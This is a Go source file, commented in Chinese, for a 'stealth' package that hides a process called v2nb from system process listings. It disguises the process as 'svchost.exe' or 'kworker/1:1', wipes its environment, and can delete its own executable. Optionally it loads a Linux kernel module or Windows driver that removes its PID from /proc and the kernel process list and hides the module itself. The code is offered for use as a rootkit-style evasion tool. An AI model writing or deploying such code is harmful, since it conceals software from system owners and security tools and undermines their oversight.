// Package stealth 让 v2nb 进程在系统进程列表里“技术性消失”。
//
// 分层设计（能力由弱到强）：
//
//	L1 用户态伪装：线程名(comm) / argv / environ / 可执行文件痕迹 /
//	               Windows PEB 中的 CommandLine 与 ImagePathName
//	L2 内核态隐藏：Linux LKM 或 Windows 驱动，把目标 PID 从 /proc 目录项、
//	               EPROCESS 活动进程链里摘掉
//
// 内核组件源码见 tools/linux-hide、tools/win-hide，方案说明见 docs/stealth-report.md。
package stealth

import (
	"os"
	"runtime"
	"strings"
	"sync"
)

// Config 控制隐藏行为，零值表示什么都不做。
type Config struct {
	Enable       bool   // 总开关
	Alias        string // 对外显示的名字
	Kernel       bool   // 是否加载内核隐藏组件（需特权）
	KernelModule string // Linux .ko 路径
	KernelDriver string // Windows .sys 路径
	HideEnv      bool   // 清空 environ 内存区
	ShredExe     bool   // 从磁盘 unlink 自身可执行文件
	HideModule   bool   // 把内核模块自身从 lsmod / PsLoadedModuleList 摘掉
	Debug        bool   // 打印自检结果
}

var (
	mu     sync.Mutex
	cfg    Config
	active bool
	logfn  = func(string, ...any) {}
)

// SetLogger 注入日志函数，一般传 logrus.Infof。
func SetLogger(f func(string, ...any)) {
	if f != nil {
		logfn = f
	}
}

// Init 完成用户态伪装，并在配置允许时加载内核隐藏组件。单步失败只记日志不阻断主流程。
func Init(c Config) error {
	mu.Lock()
	defer mu.Unlock()

	cfg = c
	if !cfg.Enable {
		return nil
	}
	if cfg.Alias == "" {
		cfg.Alias = defaultAlias()
	}
	cfg.Alias = sanitizeAlias(cfg.Alias)

	if err := maskUser(cfg); err != nil {
		logfn("[stealth] L1 用户态伪装部分失败: %v", err)
	}
	if cfg.Debug {
		for _, line := range VerifyPlatform() {
			logfn("[stealth] %s", line)
		}
	}

	if cfg.Kernel {
		if err := kernelHide(cfg); err != nil {
			logfn("[stealth] L2 内核隐藏加载失败(降级为纯用户态伪装): %v", err)
		} else {
			logfn("[stealth] L2 内核隐藏已生效, pid=%d comm=%s", os.Getpid(), cfg.Alias)
		}
	}

	active = true
	logfn("[stealth] 已启用: pid=%d alias=%s go=%s", os.Getpid(), cfg.Alias, runtime.Version())
	return nil
}

// Stop 卸载内核组件，进程退出前可选调用。
func Stop() error {
	mu.Lock()
	defer mu.Unlock()
	if !active {
		return nil
	}
	active = false
	return kernelUnhide()
}

// SelfPID 返回当前进程 pid。
func SelfPID() int { return os.Getpid() }

// AddHiddenPID 把额外进程（例如子进程）也加入隐藏集合。
func AddHiddenPID(pid int) error {
	if pid <= 0 {
		return nil
	}
	return kernelAddPID(pid)
}

func defaultAlias() string {
	if runtime.GOOS == "windows" {
		return "svchost.exe"
	}
	return "kworker/1:1"
}

// sanitizeAlias 过滤掉会破坏模块参数、日志与展示的控制字符和引号。
func sanitizeAlias(s string) string {
	s = strings.TrimSpace(s)
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c < 0x20 || c == 0x7f || c == 0x3d || c == 0x22 || c == 0x27 || c == 0x60 || c == 0x5c {
			continue
		}
		b.WriteByte(c)
	}
	out := b.String()
	if out == "" {
		return defaultAlias()
	}
	if len(out) > 60 {
		out = out[:60]
	}
	return out
}
